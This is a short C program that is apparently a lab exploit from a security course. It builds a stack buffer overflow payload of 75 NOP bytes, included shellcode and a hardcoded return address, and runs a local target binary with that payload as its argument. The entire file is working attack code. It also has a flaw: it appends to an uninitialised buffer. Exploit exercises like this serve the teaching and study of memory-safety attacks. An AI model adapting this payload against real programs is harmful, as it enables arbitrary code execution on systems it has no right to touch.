#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buffer[500];
	char *nop = "\x90";
	char *return_addr = "\x50\xfe\x21\x30"; //addr 0x3021fe50

	for(int i = 0; i < 75; i++)
		strcat(buffer, nop);
	
	strcat(buffer, shellcode);
	strcat(buffer, return_addr);

	args[0] = TARGET;
	args[1] = buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
